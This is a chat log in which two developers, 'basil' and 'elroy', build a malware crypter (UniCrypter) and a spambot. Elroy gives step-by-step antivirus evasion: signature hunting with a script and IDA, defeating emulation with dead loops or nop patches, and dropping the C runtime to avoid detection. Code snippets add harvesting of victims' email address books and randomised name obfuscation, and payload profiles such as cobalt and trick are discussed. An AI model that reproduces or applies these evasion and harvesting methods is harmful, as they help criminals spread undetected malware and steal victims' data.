[27.08.21 15:02:43] basil: Or have you already tried it?
[27.08.21 15:02:44] elroy: You can do it yourself by deploying a lot of machines
[27.08.21 15:03:04] elroy: No, you haven't.)
[27.08.21 15:03:14] elroy: Yes, you can probably do it that way
[27.08.21 15:03:37] basil: Well, and if mycrosoft binds some imprint in ip upload address.
[27.08.21 15:03:38] basil: ?
[27.08.21 15:03:58] basil: I would do that for such purposes
[27.08.21 15:04:27] elroy: No, that's definitely not it. It's called safebrowsing and they already spoke about it, but it's not that case.
[27.08.21 15:08:26] basil: Alright. Okay. Then I'll take care of the GCC binding. But I think for the frequency of the experiment we should still ask the staff to install studio on clean 7 as standard. And build the project. If there are differences in the files, it can still significantly narrow down the search area. Yes, and for the frequency of the experiment it will be important
[27.08.21 15:09:07] elroy: This is a problem, because not everyone can put the same version, and this significantly breaks the experiment
[27.08.21 15:10:22] elroy: microsoft fixes bugs on prod... savages...
[27.08.21 15:10:46] basil: then it turns out the day must also be coordinated
[27.08.21 15:10:50] basil: even more interesting
[27.08.21 15:11:30] elroy: That's a problem, I'm telling you...
[27.08.21 15:13:29] basil: there's a studio on a buildmachine now, by the way? Right?
[27.08.21 15:13:41] elroy: Three)
[27.08.21 15:14:05] basil: You mean 3 versions?
[27.08.21 15:15:03] elroy: Yes. 2017 2019 Enterprise and Professional, I do not remember 2017 or 2019.
[27.08.21 15:15:14] elroy: By the way, there are eng versions
[27.08.21 15:15:51] basil: yes. for all tastes and colors)))
[27.08.21 15:16:02] basil: With a reserve, so to speak.
[27.08.21 15:16:13] elroy: As coders asked...
[27.08.21 15:16:23] elroy: Try gcc, really interesting
[27.08.21 15:16:33] elroy: I wonder what it builds for Windows
[27.08.21 15:16:50] basil: ok. ok.
[27.08.21 15:20:40] elroy: I'll work with crypter, if you'll fix something, then in a separate branch
[27.08.21 15:21:08] basil: ok
[30.08.21 09:23:26] basil: hello
[30.08.21 09:32:35] elroy: Greetings.
[30.08.21 09:34:36] basil: Good news. I think so. This weekend I've managed, but with difficulty, to attach GCC to the project. So far I haven't managed to move the whole project. But in my opinion the most important thing is that the obfuscation works. GCC handles it correctly
[30.08.21 09:35:27] basil: I am using MinGW for now because I can build my compiler from source
[30.08.21 09:35:39] elroy: All project - all solution, or you mean UniCrypter project?
[30.08.21 09:36:17] basil: exactly crypter. And you need to translate the whole solution to GCC&
[30.08.21 09:36:18] basil: ?
[30.08.21 09:36:27] elroy: No)
[30.08.21 09:36:44] elroy: You just need to add profile, config file in solution builder
[30.08.21 09:37:16] basil: Okay. I will describe situation at the moment
[30.08.21 09:37:24] basil: So to say with details
[30.08.21 09:39:01] basil: I tried to attach GCC using CMake at first, but without much results. There's a "dense forest" of course a bunch of some obscure files with obscure purpose. Here.
[30.08.21 09:39:03] basil: But then
[30.08.21 09:42:41] basil: There's an extension for studio. It's called VisualGDB. But it creates a project. Normal readable, where everything is more or less clear and does it out of the box. With this extension I was able to use GCC. The only thing now for some reason the binary is quite big. The Hello world is about 300kb. There is an assumption that some special flags are there.
[30.08.21 09:43:13] basil: Compiler flags of course
[30.08.21 09:43:52] basil: But I think it's surmountable. Anyway, it's fundamentally possible to translate cryptor to GCC.
[30.08.21 09:44:20] elroy: You wrote that you use mingw
[30.08.21 09:44:36] basil: At the moment. Yes
[30.08.21 09:45:58] elroy: As far as I know, it uses a library to run code for the wind, like a luxe-wind conversion. That's what the size is from. I.e. it doesn't build code exactly for the bare Windows (well, it used to be that way). Because of this crutch there and the size is always higher
[30.08.21 09:46:56] elroy: I don't think the size will grow, it will just be a few hundred kb larger steadily
[30.08.21 09:48:01] basil: I had that assumption too. And you could try to build your own pure compiler from source
[30.08.21 09:48:11] basil: Maybe it will help you
[30.08.21 09:48:25] elroy: Not yet, it won't).
[30.08.21 09:48:31] elroy: Run with what you have)
[30.08.21 09:48:43] basil: okay
[30.08.21 09:48:53] elroy: So what doesn't work with the crypto project, what's the problem there?
[30.08.21 09:50:25] basil: well at the moment for some reason you can run debugging - it works. Traced it. Everything is fine. But when I try to run binary - it yells "not enough library, we're all going to die" and closes
[30.08.21 09:50:32] basil: I don't understand what's wrong yet
[30.08.21 09:51:26] elroy: gcc had a feature which builds "a large monolithic build" with all needed libraries
[30.08.21 09:51:35] elroy: See the argument
[30.08.21 09:52:05] basil: --static
[30.08.21 09:52:11] basil: I think so
[30.08.21 09:52:23] elroy: No, still was
[30.08.21 09:52:58] basil: well, anyway. There's some flags to deal with
[30.08.21 09:53:23] elroy: Yeah.
[30.08.21 14:37:30] basil: I read it. I'm in touch with martin.
[30.08.21 14:39:05] elroy: Okay.
[30.08.21 14:43:26] elroy: There's a main bot collecting addresses from local mails and from webmails.
Here after this construct
```
if (mailing_params.mailout_type & MAILOUT_ALL_LOCAL_WEBCLIENT)
		{
			debug_printf("Collecting e-mail addresses from local web mail clients\r\n");
			size_t mailing_emails_count = mailing_emails.size();
			CollectLocalWebEmails(mailing_emails);
			debug_printf("Found %d new e-mail addresses, total %d\r\n",
				mailing_emails.size() - mailing_emails_count, mailing_emails.size());
		}
```
We should add a method call
```
Server->SendAddressBook(mailing_emails);
```
And correspondingly implement a method similar to sendinfo
```
bool Server->SendAddressBook(std::set<std::string> &emails);
```
[30.08.21 14:44:13] basil: yes. I get it. Just one question.
[30.08.21 14:45:05] basil: Although. Hang on.  Now
[30.08.21 14:46:44] basil: do this sending of addresses whether I choose to send via Outlook or net
[30.08.21 14:46:47] basil: no
[30.08.21 14:46:50] basil: Right?
[30.08.21 14:48:25] elroy: Ask a question in the channel, good question. Do we exploit it or not, if we don't work with it
[31.08.21 09:28:24] basil: Hello
[31.08.21 09:30:17] elroy: Hello
[31.08.21 09:32:17] basil: Yesterday with martin sort of made the sending of address book entries. At least he saw the data being sent. No crashes. I have tested the cross-bit bot too but on local server. With GCC still in process.
[31.08.21 09:32:54] elroy: About the bot, write to the group, so that sylver sees it too.
[31.08.21 09:33:07] elroy: Ok, work on gcc, if spambot works
[31.08.21 09:33:32] elroy: I'll ask for a server one day for my customer, I'll have to test it again
[31.08.21 09:33:41] basil: Ok.
[01.09.21 09:33:29] elroy: Check it out.
[01.09.21 09:36:03] basil: yes .
[01.09.21 09:36:20] elroy: is it working?
[01.09.21 09:36:36] basil: at least I saw)))
[01.09.21 09:38:14] elroy: It happens
[01.09.21 09:38:19] elroy: e2e worked
[01.09.21 09:38:28] elroy: greetings)
[01.09.21 09:38:33] basil: hello
[01.09.21 09:39:12] elroy: I'm on vacation planning from September 16 to 30, crypter will be on you at that time. Collect questions on cleanup, profiles, etc.
[01.09.21 09:39:52] basil: ok. how can i without you(((((
[01.09.21 09:39:55] basil: ?
[01.09.21 09:40:00] basil: that's terrible
[01.09.21 09:41:39] basil: ok. I managed to build static binary for gcc. As I thought the -static flag for the linker. Some primitive data types are not supported by GCC for win. Also some problems in WinApi, but I think I will get over these difficulties anyway
[01.09.21 15:24:12] basil: I have a question here. Two, actually.
[01.09.21 15:25:17] basil: test
[01.09.21 15:25:24] basil: sorry, not included
[01.09.21 15:25:40] basil: ``
beta_payload_bk
beta_payload_cobalt
beta_payload_generic
beta_payload_loader-bot-leo
beta_payload_rundll
beta_payload_trick
```
[01.09.21 15:25:47] elroy: E2E usually doesn't need to be turned on, it works by itself
[01.09.21 15:26:01] basil: probably turned it off by itself
[01.09.21 15:26:09] elroy: Go ahead, ask him.)
[01.09.21 15:26:33] basil: as I understand all branches are highly specialized for a particular load
[01.09.21 15:26:39] basil: Right?
[01.09.21 15:26:45] elroy: Yes
[01.09.21 15:27:11] basil: So they encrypt the same files?
[01.09.21 15:27:21] basil: or something changes
[01.09.21 15:27:25] basil: ?
[01.09.21 15:27:37] elroy: Files "the same" change.
[01.09.21 15:27:44] elroy: Well, sort of.
[01.09.21 15:27:57] elroy: generic is universal
[01.09.21 15:28:04] elroy: rundll - universal
[01.09.21 15:28:10] elroy: the rest is specialized
[01.09.21 15:28:17] elroy: Do you have a profile description?
[01.09.21 15:28:55] basil: I'm just thinking about how I can then check the performance of the load in case of anything. That's how to do it at the current moment?
[01.09.21 15:29:34] elroy: Ok, I'll write how. Let's do it a little later)
[01.09.21 15:30:03] basil: Okay. Should I text you later then? Busy right now?
[01.09.21 15:30:12] basil: Some
[01.09.21 15:30:19] elroy: Busy right now, I'll probably text you in an hour
[01.09.21 15:30:27] basil: ok.
[01.09.21 16:15:06] elroy: https://file.io/utsxNIUxTrsC
```
U...Ug6gs{jaPa!D@SakSa{Ascx#d
```
[01.09.21 16:19:35] elroy: That was a description of the profiles and crypto system.
Description of the profiles is more recent, if I've already discounted before, update your own.
[01.09.21 16:19:48] elroy: And this is all tests with sources, that I have.
https://file.io/IZ5zhZ6xwWpg
[01.09.21 16:22:22] basil: ok. If you have any questions, can I write?
[01.09.21 16:23:42] elroy: You always can write, of course)
[01.09.21 16:23:48] elroy: Checking generic exe, I think is clear.
dll->exe - as dll take library rundll, encrypt it, work entry point, you should see message "DllMain() called, TLS OK".
[01.09.21 16:24:08] elroy: Provile bk - based on rundll
[01.09.21 16:25:00] elroy: For rundll the same, the same library, you need to see two messages, "DllMain() called, TLS OK" and message from call function, for example from One, there are 4 parameters
[01.09.21 16:26:07] elroy: For Leo - Leo test library, there you need to see in main message with file path. If the same test library is crypted with help of rundll or bk - path to the file will be empty
[01.09.21 16:26:14] elroy: Shellcodes I think it's clear
[01.09.21 16:26:36] elroy: cobalt - waiting for cripto request from manuel, he hasn't confirmed anything yet
[01.09.21 16:27:01] elroy: tric is exe generic, but without load import table processing
[01.09.21 16:27:11] elroy: pretty much everything...
[01.09.21 16:28:36] basil: Okay. Here's a question. I tried using avclean, but it has a limited set of AVs. Or I should use -define switch.
[01.09.21 16:29:28] elroy: It almost never works with a specific av. You have to put general, I think -a general
[01.09.21 16:29:28] basil: -defaulth
[01.09.21 16:29:37] elroy: And timeout...
[01.09.21 16:29:48] elroy: Or default
[01.09.21 16:29:51] elroy: don't remember)
[01.09.21 16:30:13] basil: during which avclean looks if AV deleted a file or not
[01.09.21 16:30:23] elroy: yes
[01.09.21 16:31:08] basil: I guess I've got an incomprehensible API. Very handy utility, of course. Otherwise, it would be a great pain to clean it up.
[01.09.21 16:31:43] elroy: What about SignFInder method?
[01.09.21 16:31:51] elroy: That's all I use.
[01.09.21 16:31:56] elroy: Only it works
[01.09.21 16:32:29] basil: That's how it came up. But I never used it. Can you tell me about it?
[01.09.21 16:32:38] elroy: Yes.
[01.09.21 16:33:51] basil: Okay. I am listening carefully. And preferably the tool itself.
[01.09.21 16:34:46] elroy: https://file.io/Iqcf8zfcxC2m
[01.09.21 16:34:55] elroy: This is a corrected script
[01.09.21 16:36:59] elroy: How it works
First do the build.bat .... as usual.
Then open solution in studio, select project and build profile, build, get executive file (or dll) and pdb.
[01.09.21 16:37:41] elroy: IDA must be on the machine, where you compiled it or you have to give the .pdb file so IDA can open it
[01.09.21 16:37:59] basil: That's not so hard. And what's next?
[01.09.21 16:38:27] elroy: You put the .dll on the machine with the av, next to the script. You add the directory with the script to exceptions
[01.09.21 16:38:44] elroy: Write in console
[01.09.21 16:39:06] elroy: sf.new.py file.exe sect 0
[01.09.21 16:39:31] elroy: It creates a directory next to it, in the directory name information, number of fragments...
[01.09.21 16:39:45] elroy: you copy the directory to the table, or to another place and check it on AV
[01.09.21 16:40:14] elroy: All files that remained after checking are clean. I.e. their signature was deleted
[01.09.21 16:41:54] elroy: Again in the console
sf.new.py file.exe man <snap> <size> <number of bytes, usually 40>
These parameters are specified in the 16-ric system, 40 is also, it's 64 bytes.
<offset> <size> are in the file names
[01.09.21 16:42:30] elroy: You get the folder
[01.09.21 16:42:34] elroy: also to check
[01.09.21 16:42:46] elroy: Get the remaining files
[01.09.21 16:43:04] basil: i.e. you increase the discreteness
[01.09.21 16:43:27] elroy: Usually in two approaches, as described.
[01.09.21 16:43:42] elroy: Usually you don't need more, but yes, you can do as much as you like
[01.09.21 16:43:48] elroy: 64 bytes is considered optimal
[01.09.21 16:44:21] basil: Listen, how does this utility differ from the one we used before?
[01.09.21 16:45:31] elroy: After the last iteration, you take the offset and size from the file names, in a 16-rib system.
Open original file in IDA, allow to pull .pdb, then Jump -> Jump to file offset, specify offset
[01.09.21 16:45:36] elroy: This is your signature
[01.09.21 16:45:57] elroy: Thanks to pdb you know what function it is in
[01.09.21 16:46:08] elroy: This is an example of the detects code search
[01.09.21 16:46:33] elroy: Try to use...
[01.09.21 16:46:43] elroy: This utility is different in speed
[01.09.21 16:47:11] elroy: It doesn't tear the file by whatever fragments mixed up with pe headers, it processes a specified section
[01.09.21 16:47:16] elroy: A bit smarter utility
[01.09.21 16:47:19] elroy: And it works faster
[01.09.21 16:48:15] basil: sect 0 - code section apparently?
[01.09.21 16:48:35] elroy: yes
[01.09.21 16:48:46] elroy: There are detects in other places
[01.09.21 16:48:57] elroy: Sometimes by emulation, you have to fix the code then
[01.09.21 16:49:10] elroy: This tool just finds where it is...
[01.09.21 16:50:00] basil: Well, there probably won't be much more from it. But it's good, too. And could you also describe how you check the emulation of the file?
[01.09.21 16:52:21] elroy: I insert output during emulation.
[01.09.21 16:52:30] elroy: Or return
[01.09.21 16:52:46] elroy: or loop to infinity
[01.09.21 16:52:53] elroy: Depends on what bites)
[01.09.21 16:53:20] elroy: You can comment on that fragment
[01.09.21 16:53:55] elroy: We've often had detections after it gets to the API, here's that variant with the winapi that's there.
[01.09.21 16:54:05] elroy: You just mess up the algorithm there, it doesn't get to the api
[01.09.21 16:54:12] elroy: It is clear that by emulation
[01.09.21 16:54:36] elroy: Usually by emulation some behavior pattern is caught, you have to change the algorithm
[01.09.21 16:55:18] elroy: Sometimes it catches sequence of calls to some api, if you change them there - code stops working and detection leaves - it means by emulation
[01.09.21 16:55:24] elroy: Everything is primitive...
[01.09.21 16:55:30] elroy: It's just a fantasy
[01.09.21 16:55:59] elroy: You can patched it with Ida, replacing a bit of code with nop along with int 3
[01.09.21 16:59:04] basil: As you said, emulation is a process when AB is trying to emulate some parts of the code, and AB doesn't know that these parts can be dead and can't be executed early in time. It encounters an infinite loop or something else and lets the cryptra "in peace". Did I get that right?
[01.09.21 16:59:53] elroy: Well, almost))
[01.09.21 17:00:00] elroy: I got it right.
[01.09.21 17:00:34] elroy: If the flagging detector, it looks for a known area, or rather, emulates everything until it sees that the necessary execution
[01.09.21 17:00:50] elroy: This can be both large and small code fragments
[01.09.21 17:00:55] elroy: It depends on what kind of detection
[01.09.21 17:01:14] basil: ok.
[01.09.21 17:01:29] elroy: Usually clings to the beginning of the program
[01.09.21 17:01:43] elroy: Or on some dangerous section
[01.09.21 17:01:54] elroy: Holoving, for example, can catch
[01.09.21 17:03:18] basil: Okay. And the last question for today. I have it about the load. What is meant by the term shellCode? Is it some kind of exploit?
[01.09.21 17:31:39] elroy: This is shellcode...
[01.09.21 17:31:49] elroy: It's a binary code that runs
[01.09.21 17:31:53] elroy: Well, how do you say
[01.09.21 17:31:58] elroy: Naked code or something.
[01.09.21 17:32:04] elroy: Look into the crypter
[01.09.21 17:32:10] elroy: Source code
[01.09.21 17:50:13] basil: I got it. Some position-independent code which just isn't represented as an executable file
[01.09.21 17:50:28] elroy: Yes.
[01.09.21 17:50:36] elroy: I sent you some samples of that code)
[01.09.21 17:51:19] elroy: There is a special-prescribed code, then dump it
[01.09.21 17:51:40] elroy: So you don't have to bother, there are ready-made binary files
[01.09.21 17:54:09] basil: okay. everything seems to be clear now.
[01.09.21 17:55:50] elroy: Now we have detectors on the build-machine
[01.09.21 17:56:02] elroy: Try to see how to clean up tomorrow or the next day
[01.09.21 17:56:15] elroy: With this method I described today
[01.09.21 17:57:04] basil: ok. ok.
[02.09.21 14:23:16] elroy: hello
[02.09.21 14:23:26] basil: Hello.
[02.09.21 14:24:49] elroy: Well done with macros, handy
```
#define Packer yKdgqXRljUjxApJmBuwILN
#define Encrypter xXWjKcylUcchHWsrt
#define XorZIP JCDYudtdNQYNh
#define ArithmeticZIP HNVLTvTYFYovwtUMw
```
And what is written is clear, and the functionality is in place. I just noticed))
[02.09.21 14:27:15] basil: This Packer itself can be extended quite easily. By the way. That is, if you need to add one more encryption algorithm. And you can just change proportions in which data are encrypted using specific algorithm
[02.09.21 14:27:58] elroy: That's good too
[02.09.21 14:52:24] elroy: Didn't deal with the detects search?
[02.09.21 14:53:10] basil: I'll come back to this subject now. But right now I'm sitting with GCC.
[02.09.21 14:53:32] basil: I mean, I'll come back later
[02.09.21 14:54:19] elroy: There's just a cool example. The detector sits on a standard function from the crt library.
[02.09.21 14:55:04] basil: Can you tell me more about it? Did you find it yourself?
[02.09.21 14:55:19] elroy: Well, by the method I described yesterday.
[02.09.21 14:55:48] basil: I just thought you wanted to brag
[02.09.21 14:56:00] basil: In a good way of course
[02.09.21 14:56:00] elroy: No. That's a problem))
[02.09.21 14:56:18] elroy: I found it, but what's the use?
[02.09.21 14:56:23] elroy: I can't clean it
[02.09.21 14:56:43] elroy: Because it's not clear how you can change something in a standard function
[02.09.21 14:57:11] basil: And what's the detector on the standard function?
[02.09.21 14:57:31] elroy: Yes
[02.09.21 14:58:00] elroy: That's what I wanted to show you. Can you spare a few minutes?
[02.09.21 15:22:08] basil: test
[02.09.21 15:26:45] elroy: yes, I see the word test
[02.09.21 15:27:30] basil: ok. let's keep talking
[02.09.21 15:28:02] elroy: the next 64 bytes after ret contains the signature
[02.09.21 15:28:20] elroy: If pdb pulled up, you can see it's seh
[02.09.21 15:28:52] elroy: This is the exception handler, protection, etc., what the standard library adds to your code.
[02.09.21 15:29:12] elroy: This is the one that has the detection hanging on it right now. Which is very interesting)
[02.09.21 15:29:31] basil: seh?
[02.09.21 15:29:32] elroy: There is no way to clean it up
[02.09.21 15:29:36] elroy: yes
[02.09.21 15:30:02] basil: and only one av has this?
[02.09.21 15:30:09] basil: or all of them?
[02.09.21 15:30:21] elroy: Detect in several at once
[02.09.21 15:30:31] elroy: But they're probably on the same engine
[02.09.21 15:31:08] basil: Well, I can only assume it's in the computer settings
[02.09.21 15:31:15] basil: you can change something
[02.09.21 15:31:16] elroy: I am watching now with trustport. Look for example at the file on dincheck
[02.09.21 15:31:44] elroy: seh is disabled in the compiler settings. Studio does it its own way anyway.
[02.09.21 15:32:02] elroy: *in the project settings
[02.09.21 15:33:29] basil: everything is red
[02.09.21 15:33:48] basil: well, for seh put detect.....
[02.09.21 15:34:03] basil: Maybe they made a mistake
[02.09.21 15:34:09] basil: and remove it
[02.09.21 15:34:27] elroy: So that's the riddle. And you can't clean it out. It generates code and puts its chips to the code, which then scorches the code... You have to clean it up.
[02.09.21 15:34:47] basil: that's the question
[02.09.21 15:35:14] basil: But if you erase that signature. Well it'll say nop, the file will work correctly
[02.09.21 15:35:18] basil: tried it?
[02.09.21 15:35:31] elroy: Not a fact
[02.09.21 15:35:38] elroy: But this will create a new one))
[02.09.21 15:36:54] basil: listen. If you have the patched files now - try running
[02.09.21 15:37:01] basil: Maybe it'll work?
[02.09.21 15:40:23] elroy: Judging by the code it should work...
[02.09.21 15:40:45] elroy: You have to patch and run. But why?)
[02.09.21 15:41:25] basil: Maybe this is one of the solutions. To patch files after the build? Or is it not an option?
[02.09.21 15:42:28] elroy: No, not an option.
[02.09.21 15:42:55] elroy: It's too expensive to patch automatically, it can change. Manually is not an option at all.
[02.09.21 15:43:05] basil: well on seh of course.... Interesting
[02.09.21 15:43:16] elroy: I should send crt to trash.
[02.09.21 15:43:20] basil: Monsieur knows a lot about perversion.
[02.09.21 15:43:41] elroy: He does))
[02.09.21 15:43:47] basil: seh...... Look at that.
[02.09.21 15:43:50] basil: !
[03.09.21 09:31:02] elroy: hello. What news?
[03.09.21 10:05:42] basil: Hello.
[03.09.21 10:06:00] basil: Well the news is honestly not very positive
[03/09/21 10:07:07] basil: at the moment I'm stuck in ntdll.h. A lot of all sorts of windows dependent variable structures and so on. I don't even know if it's worth continuing with GCC.
[03.09.21 10:07:52] basil: I've been using it for a week already. So far I'm not able to build crypter. Somehow I don't even see the light at the end of the tunnel.
[03.09.21 10:09:22] elroy: Then don't continue
[03.09.21 10:10:00] basil: what should I switch to now?
[03.09.21 10:10:31] basil: crt?
[03.09.21 10:10:59] elroy: On crt you need to:
1) deal with the cleanup.
2) throw out crt, replace all of its code with a normal one)
[03.09.21 10:11:37] elroy: They say if you throw out crt, defender comes to life, starts detecting in different directions
[03.09.21 10:11:55] elroy: So all this will have to be done in a separate branch
[03.09.21 10:12:31] basil: I will of course deal with cleaning. I think it's a matter of technique. But what about crt? How do I do it even theoretically?
[03.09.21 10:13:34] elroy: I'll send you an example of hello world project without crt
[03.09.21 10:13:36] elroy: Check it out.
[03.09.21 10:17:11] elroy: https://file.io/pnneQ3DESbxf
[03.09.21 10:17:55] elroy: it's not going there because of wsprintf, it needs to be corrected or removed)
[03.09.21 10:18:26] elroy: You got it all set up in the project properties
[03.09.21 10:18:42] basil: a moment
[03.09.21 10:22:27] basil: almost everything is set to "no"
[03.09.21 10:22:36] basil: someone so....
[03.09.21 10:23:09] basil: i.e. by setting most flags to "no" crt is removed?
[03.09.21 10:23:18] elroy: nope
[03.09.21 10:23:27] elroy: I'll tell you
[03.09.21 10:23:29] basil: What's the fine point then?
[03.09.21 10:23:44] basil: look, did I do something wrong?
[03.09.21 10:24:12] basil: maybe I said something wrong. Any remarks?
[03.09.21 10:24:48] elroy: Open project properties, linker -> Input
[03.09.21 10:25:06] basil: Yes (/NODEFAULTLIB)?
[03.09.21 10:25:09] basil: got it
[03.09.21 10:25:11] elroy: Yes
[03.09.21 10:25:29] elroy: the rest is just turned off by code and assembly rules
[03.09.21 10:25:32] elroy: All garbage there...
[03.09.21 10:25:43] elroy: And there's a line just above
[03.09.21 10:25:47] elroy: The libraries are written there
[03.09.21 10:26:09] basil: We don't even need them libraries
[03.09.21 10:26:16] basil: because of getapi
[03.09.21 10:26:21] elroy: This is what you link if you need it. If you don't need it, you have to remove it. Keep only kernel32 and others if needed.
[03.09.21 10:27:09] elroy: More
[03.09.21 10:27:45] elroy: Very often build crashes with error, that memcpy, memset, etc. was not found.
[03.09.21 10:27:54] elroy: Although you're not using them anywhere
[03.09.21 10:28:12] basil: stl?
[03.09.21 10:28:24] elroy: That means somewhere assigning values to variables, copying variables, zeroing structures of type = { 0 };
[03.09.21 10:28:42] elroy: Maybe yes, stl needs something
[03.09.21 10:28:53] elroy: vectors and stuff don't work now
[03.09.21 10:29:07] basil: great....
[03.09.21 10:29:08] elroy: forget about std::
[03.09.21 10:29:12] basil: just great
[03.09.21 10:29:17] elroy: ))
[03.09.21 10:29:32] basil: string also I take it goes to hell?
[03.09.21 10:29:39] elroy: of course.
[03.09.21 10:29:45] elroy: char* is used
[03.09.21 10:30:00] elroy: There's a function in the template for an example of working with strings
[03.09.21 10:30:02] elroy: I can send you
[03.09.21 10:30:13] elroy: *disk more
[03.09.21 10:30:14] basil: I have a feeling we'll soon be like in the good old days. assembler malware
[03.09.21 10:30:26] basil: ok. if you can
[03.09.21 10:31:01] elroy: I looked it up now, there's enough
[03.09.21 10:31:14] elroy: See CustomStrings and CustomMemory files
[03.09.21 10:31:36] elroy: Minus of these functions can be also, they can be caught by AV
[03.09.21 10:31:42] elroy: That's the other side
[03.09.21 10:31:49] elroy: Do you know rust language ?
[03.09.21 10:32:30] basil: tried it once. With garbage collector + compilable. But this rust has a very specific compiler.
[03.09.21 10:32:49] basil: very fancy for 24/7 systems
[03.09.21 10:33:57] basil: It used to be just a recommendation to avoid std and stl. And now the way I see it, the cryptors have done their work.
[03.09.21 10:33:58] elroy: orval's cryptor's pretty good on it) So far, no detects and minimal size
[03.09.21 10:34:13] basil: Come on!
[03.09.21 10:34:14] elroy: You're a little wrong)
[03.09.21 10:34:24] elroy: Recommendations were just to get started
[03.09.21 10:34:30] elroy: All load is written without CRT
[03.09.21 10:34:49] elroy: Our bot should also be without crt
[03.09.21 10:34:54] basil: and now go to rust?
[03.09.21 10:35:16] elroy: this is all related to exactly what you saw yesterday - uncleanable detects that roll on crt
[03.09.21 10:35:27] elroy: Not going to rust yet
[03.09.21 10:35:27] basil: maybe then go
[03.09.21 10:35:31] elroy: Working as before
[03.09.21 10:35:44] basil: okay
[03.09.21 10:36:00] elroy: tried it on go, orval says fuzzy hashes give 80% concurrency between files + bigger size
[03.09.21 10:36:25] basil: It's easier now.
[03.09.21 10:37:47] basil: yeah... There's plenty of std and stl in our crypto
[03.09.21 10:38:06] basil: Too bad
[03.09.21 10:38:11] basil: too bad
[03.09.21 10:38:33] elroy: They're parsing AV. I'm also worried about spambot. It's full there too, but we'll clean it up differently.
[03.09.21 10:38:46] elroy: Now almost nobody works with bot in practice, it's clean.
[03.09.21 10:38:59] elroy: That's why there are no detects (as you know...)
[03.09.21 10:39:11] basil: yeah by the way
[03.09.21 10:39:29] basil: waiting for the moment of its use with a shudder
[03.09.21 10:39:54] basil: jefeerson never wrote anything
[03.09.21 10:40:00] basil: again by the way
[03.09.21 10:40:12] elroy: you just need to develop your functions there instead of vectors, sheets, etc., it will fit there just fine in this form
[03.09.21 10:40:27] elroy: He probably has no time)
[03.09.21 10:40:46] basil: it's like you overheard through the wall
[03.09.21 10:40:51] basil: )))
[03.09.21 10:40:58] basil: That's what he said
[03.09.21 10:41:47] elroy: So we won't rewrite whole bot there, we'll just develop couple of classes that implement same sheet, set, vector, write some algorithms to sort them. Basically, we'll just write what's used there. And replace.
[03.09.21 10:42:22] basil: logical, of course.... But as usual
[03.09.21 10:42:32] basil: something somewhere somewhere....
[03.09.21 10:42:44] elroy: It can't happen without it)
[03.09.21 10:44:04] basil: listen, one more question. I didn't say anything bad to you today, I didn't offend you in any way, I didn't insult you. I have the feeling that I've done something wrong and you're offended.... Maybe it's a rich fantasy.
[03.09.21 10:44:31] elroy: Richest)
[03.09.21 10:44:40] basil: I see. Thanks
[03.09.21 10:44:57] basil: That was technically said.
[03.09.21 10:44:58] elroy: a coder should have a fantasy)))
[03.09.21 10:45:12] basil: I respected you even more)))
[03.09.21 10:45:25] elroy: I have a question.
[03.09.21 10:45:36] elroy: I praised your code yesterday, the one with macros
[03.09.21 10:45:43] elroy: But I didn't find it today)))
[03.09.21 10:45:53] elroy: And where was it entered originally?
[03.09.21 10:46:13] basil: PeReader
[03.09.21 10:46:24] elroy: I often get confused by the git...
[03.09.21 10:46:51] elroy: I didn't see it in UniCrypter.cpp
[03.09.21 10:46:59] elroy: This is somehow confusing
[03.09.21 10:47:02] elroy: It's there, isn't it?
[03.09.21 10:47:19] basil: no. i'll tell you exactly where
[03.09.21 10:47:21] basil: where
[03.09.21 10:47:45] basil: wait a second
[03.09.21 10:50:25] basil: right here
[03.09.21 10:50:32] basil: ``
PeReader::createPayLoadHeader(std::vector<char>& payLoad, int payLoadType)
```
[03.09.21 10:50:47] basil: ```
	std::string classesNoiseNames =
		"#define Packer " + getRandName(30) + "\r\n"
		"#define Encrypter " + getRandName(30) + "\r\n"
		"#define XorZIP " + getRandName(30) + "\r\n"
		"#define ArithmeticZIP " + getRandName(30) + "\r\n";
```
[03.09.21 10:51:51] basil: did you find it?
[06.09.21 16:11:11] elroy: I was still making edits there...
[06.09.21 16:11:43] basil: More edits?
[06.09.21 16:11:48] basil: Shit.
[06.09.21 16:11:59] basil: Now...
[06.09.21 16:12:43] elroy: Yes... Bugs corrected.
[06.09.21 16:19:37] basil: It's okay. I uploaded it later.
[06.09.21 16:33:41] basil: How cumbersome this crypto-.... has become
[06.09.21 16:34:08] elroy: But how cool it's gotten
[06.09.21 16:34:19] elroy: I gave out a batch of 100 clean ones today
[06.09.21 16:34:29] basil: I don't know...
[06.09.21 16:34:41] elroy: And they are different. I haven't cleaned it once in a week.
[06.09.21 16:34:45] elroy: It's clean.
[06.09.21 16:34:58] basil: if only from this point of view
[06.09.21 16:35:29] elroy: he's beautiful))
[06.09.21 16:35:42] basil: listen, is it only this kripthera itself forms a stub or all such?
[06.09.21 16:36:03] elroy: People worked on it, many crypto generates stub
[06.09.21 16:36:09] elroy: Each one has its own
[06.09.21 16:36:24] elroy: Our uniqueness is code wrapping
[06.09.21 16:36:31] elroy: Dead and live branch
[06.09.21 16:36:35] elroy: That's a lot to take in.
[06.09.21 16:36:49] basil: good. excellent.
[06.09.21 16:37:31] elroy: Yes. We need to develop trash code generator
[06.09.21 16:37:37] elroy: More variability)
[06.09.21 16:37:54] elroy: Although, it's already spelled out and put into parameters.
[06.09.21 16:38:15] basil: I agree. But I think there's still a obfuscation in the runtime in front of me.
[06.09.21 16:38:25] basil: but of course, you still have to live for it
[06.09.21 16:38:36] elroy: Now it lacks normal smearing in three sections. I need it to smear randomly, we have static smearing.
[06.09.21 17:18:27] basil: very funny. Just happened to notice
```
// This is the perversion for position-independent code, arr[] = "name" doesn't work.
```
[06.09.21 17:18:55] elroy: But it's true.
[06.09.21 17:19:01] elroy: It doesn't work there
[06.09.21 17:19:06] basil: I agree
[06.09.21 17:19:07] elroy: It compiles differently
[06.09.21 17:19:09] elroy: ))
[08.09.21 09:50:48] elroy: hello
[08.09.21 09:50:59] basil: Hello.
[08.09.21 09:51:16] elroy: How's it going?
[08.09.21 09:51:44] basil: Not really at all. But not very.
[08.09.21 09:51:57] basil: It collects load from me incorrectly. Crashes
[08.09.21 09:52:24] basil: Exactly, it's going to collect load. But somehow it works only once after start
[08.09.21 09:52:53] basil: Of course, it's too cumbersome
[08.09.21 09:53:48] basil: I tried to debug it. But still don't understand why it collects load incorrectly. More exactly it decrypts with this packer
[08.09.21 09:54:01] basil: I don't know why yet
[08.09.21 09:54:22] basil: I have another question
[08.09.21 09:55:07] basil: We put load data into code section by means of vector. And if we remove crt, what then?
[08.09.21 09:56:10] elroy: We have to put it differently
[08.09.21 09:57:59] basil: should I write a self-field class or something else?
